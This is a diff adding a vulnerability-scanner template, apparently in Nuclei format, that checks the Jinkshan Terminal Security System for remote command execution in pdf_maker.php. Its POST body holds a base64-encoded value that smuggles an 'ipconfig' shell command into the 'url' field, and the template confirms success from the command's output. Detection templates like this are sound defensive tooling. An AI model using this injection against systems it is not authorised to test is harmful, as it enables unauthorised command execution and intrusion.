@@ -1,0 +1,26 @@
+id: poc-jinkshan-terminal-security-system-pdf-maker-rce
+info:
+  name: Jinkshan Terminal Security System pdf_maker.php Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Exploitation of a command execution vulnerability in the pdf_maker.php file of Jinkshan Terminal Security System.
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/inter/pdf_maker.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Windows IP"
+          - "IPv4"
+          - "DNS"
